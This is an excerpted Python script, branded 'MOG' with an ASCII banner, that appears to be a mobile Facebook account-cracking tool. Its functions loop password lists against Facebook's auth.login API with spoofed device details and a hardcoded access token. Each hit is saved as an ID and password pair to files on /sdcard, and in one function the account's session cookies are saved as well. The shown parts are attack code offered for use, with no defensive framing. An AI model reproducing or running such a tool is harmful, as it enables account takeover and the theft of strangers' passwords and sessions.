...
[[[[, ,[[[[, ,[[     \[[,[[[   [[[[[[/
$$$$$$$$"$$$ $$$,     $$$"$$c.    "$$
888 Y88" 888o"888,_ _,88P `Y8bo,,,o88o
MMM  M'  "MMM  "YMMMMMP"    `'YMUP"YMM
------------------------------------------------------------""" )
def linex():
	print('\033[1;37m-'*51)
def clear():
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python MOG.py')
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MOG-M1] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [OK-MOG] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-MOG] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [CP-MOG] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MOG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MOG-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [OK-MOG] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MOG-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-ACC] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP-ACC] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CHECKPOINT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MOG-M3] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                data = {'adid':adid,
                                        ...
                                        "locale":"as_MM","client_country_code":"MM",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [CP-MOG] '+ids+' | '+pas+'\033[1;97m')                                                
                                                open('/sdcard/MOG-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MOG-R] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MOG-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
                                        open('/sdcard/MOG-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        open('/sdcard/MOG-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
